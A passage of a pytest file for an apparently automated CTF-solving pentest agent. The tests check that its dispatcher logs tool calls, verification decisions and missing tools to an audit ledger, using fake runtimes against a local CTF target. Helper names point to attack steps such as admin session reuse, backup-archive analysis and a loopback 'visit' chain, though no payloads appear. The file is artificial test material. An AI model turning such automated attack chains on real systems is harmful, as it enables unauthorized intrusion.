    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="web",
        hint="",
        run_id="run-ledger-verified",
        ledger_root=tmp_path / "ledgers",
    )

    events = SessionLedger(tmp_path / "ledgers").read_events("run-ledger-verified")
    event_types = [event["event_type"] for event in events]

    assert result.success is True
    assert result.flag == "flag{ledger_verified_ok}"
    assert "dispatcher_started" in event_types
    assert "tool_called" in event_types
    assert "tool_finished" in event_types
    assert "verification_decision" in event_types
    assert "task_finished" in event_types
    assert event_types.index("dispatcher_started") < event_types.index("tool_called") < event_types.index("tool_finished") < event_types.index("verification_decision") < event_types.index("task_finished")
    tool_called_event = next(event for event in events if event["event_type"] == "tool_called")
    tool_finished_events = [event for event in events if event["event_type"] == "tool_finished"]
    verification_event = next(event for event in events if event["event_type"] == "verification_decision")
    task_finished_event = next(event for event in events if event["event_type"] == "task_finished")
    assert tool_called_event["payload"]["tool_name"] in {"browser_action", "proxy_action"}
    assert any(
        event["payload"]["tool_name"] in {"browser_action", "proxy_action"}
        for event in tool_finished_events
    )
    assert any(event["payload"]["ok"] is True for event in tool_finished_events)
    assert verification_event["payload"]["decision"] == "verified"
    assert task_finished_event["payload"]["success"] is True
    assert task_finished_event["payload"]["flag"] == "flag{ledger_verified_ok}"


@pytest.mark.asyncio
async def test_dispatcher_writes_missing_tools_event_to_session_ledger(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    set_notes_file(tmp_path / "notes_ledger_missing.json")
    notes_module._notes.clear()

    async def fake_phase_recon(self, target):
        return {
            "html": "",
            "content": "",
            "forms": [],
            "endpoints": [],
            "recon_missing_tools": ["browser", "http_request"],
        }

    monkeypatch.setattr(
        CTFTaskDispatcher,
        "_phase_recon",
        fake_phase_recon,
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    dispatcher = CTFTaskDispatcher(runtime=_DirectFlagPageRuntime(), progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="web",
        hint="",
        run_id="run-ledger-missing",
        ledger_root=tmp_path / "ledgers",
    )

    events = SessionLedger(tmp_path / "ledgers").read_events("run-ledger-missing")
    event_types = [event["event_type"] for event in events]

    assert result.success is False
    assert result.missing_tools == ["browser", "http_request"]
    assert "dispatcher_started" in event_types
    assert "missing_tools_recorded" in event_types
    assert "task_finished" in event_types
    assert event_types.index("dispatcher_started") < event_types.index("missing_tools_recorded") < event_types.index("task_finished")
    missing_tools_event = next(event for event in events if event["event_type"] == "missing_tools_recorded")
    task_finished_event = next(event for event in events if event["event_type"] == "task_finished")
    assert missing_tools_event["payload"]["missing_tools"] == ["browser", "http_request"]
    assert task_finished_event["payload"]["success"] is False


@pytest.mark.asyncio
async def test_execute_terminal_commands_writes_execute_command_tool_audit_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_helper_terminal.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(runtime=_HelperAuditRuntime(), progress_callback=None)
    dispatcher._setup_session_ledger(run_id="run-helper-terminal", ledger_root=tmp_path / "ledgers")

    result = await dispatcher._execute_terminal_commands(
        "http://ctf.local/",
        ['curl -s "http://ctf.local/"'],
    )

    events = SessionLedger(tmp_path / "ledgers").read_events("run-helper-terminal")
    execute_called = next(event for event in events if event["event_type"] == "tool_called")
    execute_finished = next(event for event in events if event["event_type"] == "tool_finished")

    assert result.progress is True
    assert execute_called["payload"]["tool_name"] == "execute_command"
    assert execute_called["payload"]["action"] == "shell"
    assert execute_finished["payload"]["tool_name"] == "execute_command"
    assert execute_finished["payload"]["ok"] is True


@pytest.mark.asyncio
async def test_submit_form_request_writes_proxy_tool_audit_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_helper_form.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(runtime=_HelperAuditRuntime(), progress_callback=None)
    dispatcher._setup_session_ledger(run_id="run-helper-form", ledger_root=tmp_path / "ledgers")

    response, request_url = await dispatcher._submit_form_request(
        "http://ctf.local/contact",
        {
            "method": "POST",
            "action": "http://ctf.local/contact",
        },
        {"message": "hello"},
    )

    events = SessionLedger(tmp_path / "ledgers").read_events("run-helper-form")
    proxy_called = next(event for event in events if event["event_type"] == "tool_called")
    proxy_finished = next(event for event in events if event["event_type"] == "tool_finished")

    assert response["status_code"] == 200
    assert request_url == "http://ctf.local/contact"
    assert proxy_called["payload"]["tool_name"] == "proxy_action"
    assert proxy_called["payload"]["action"] == "request"
    assert proxy_finished["payload"]["tool_name"] == "proxy_action"
    assert proxy_finished["payload"]["ok"] is True


@pytest.mark.asyncio
async def test_fetch_admin_with_sid_writes_proxy_tool_audit_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_helper_admin.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(
        runtime=_HelperAuditRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher._setup_session_ledger(run_id="run-helper-admin", ledger_root=tmp_path / "ledgers")
    dispatcher.state = CTFState(target="http://ctf.local/", goal="get flag")

    flag = await dispatcher._fetch_admin_with_sid("http://ctf.local", "helper-admin")

    events = SessionLedger(tmp_path / "ledgers").read_events("run-helper-admin")
    tool_called_events = [event for event in events if event["event_type"] == "tool_called"]
    tool_finished_events = [event for event in events if event["event_type"] == "tool_finished"]

    assert flag == "flag{helper_admin_ok}"
    assert any(
        event["payload"]["tool_name"] == "proxy_action"
        and event["payload"]["action"] == "request"
        and str(event["payload"]["target"]).endswith("/admin")
        for event in tool_called_events
    )
    assert any(
        event["payload"]["tool_name"] == "proxy_action"
        and event["payload"]["ok"] is True
        and str(event["payload"]["target"]).endswith("/admin")
        for event in tool_finished_events
    )


@pytest.mark.asyncio
async def test_download_and_analyze_backup_artifact_writes_execute_command_tool_audit_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._pick_python_command",
        lambda runtime: "python",
    )
    set_notes_file(tmp_path / "notes_backup_audit.json")
    notes_module._notes.clear()

    runtime = _HelperAuditRuntime()
    async def _fake_execute_command(command, timeout=180):
        return SimpleNamespace(
            exit_code=0,
            stdout='{"url":"http://ctf.local/backup.zip","kind":"zip","entries":[],"interesting":[],"flag":null,"php_unserialize":false,"profile_photo_poisoning":false}',
            stderr="",
        )
    runtime.execute_command = _fake_execute_command  # type: ignore[method-assign]

    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher._setup_session_ledger(run_id="run-backup-audit", ledger_root=tmp_path / "ledgers")

    outcome = await dispatcher._download_and_analyze_backup_artifact(
        "http://ctf.local/backup.zip",
        "http://ctf.local/",
    )

    events = SessionLedger(tmp_path / "ledgers").read_events("run-backup-audit")

    assert outcome.progress is True
    assert any(
        event["event_type"] == "tool_called"
        and event["payload"]["tool_name"] == "execute_command"
        for event in events
    )
    assert any(
        event["event_type"] == "tool_finished"
        and event["payload"]["tool_name"] == "execute_command"
        and event["payload"]["ok"] is True
        for event in events
    )


@pytest.mark.asyncio
async def test_attempt_docker_loopback_visit_chain_writes_tool_audit_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    from pentestagent.harness.session_ledger import SessionLedger

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_loopback_audit.json")
    notes_module._notes.clear()

    dispatcher = CTFTaskDispatcher(runtime=_ExploitAuditRuntime(), progress_callback=None)
    dispatcher._setup_session_ledger(run_id="run-loopback-audit", ledger_root=tmp_path / "ledgers")
    dispatcher.state = CTFState(target="http://127.0.0.1:3000/", goal="get flag")
    monkeypatch.setattr(
        dispatcher,
        "_fetch_admin_with_sid",
        lambda base, sid: asyncio.sleep(0, result="flag{loopback_audit_ok}"),
    )

    outcome = await dispatcher._attempt_docker_loopback_visit_chain("http://127.0.0.1:3000")

    events = SessionLedger(tmp_path / "ledgers").read_events("run-loopback-audit")

    assert outcome.flag == "flag{loopback_audit_ok}"
    assert any(
        event["event_type"] == "tool_called"
        and event["payload"]["tool_name"] == "execute_command"
        for event in events
    )
    assert any(
        event["event_type"] == "tool_called"
        and event["payload"]["tool_name"] == "proxy_action"
        and str(event["payload"]["target"]).endswith("/visit")
        for event in events
    )
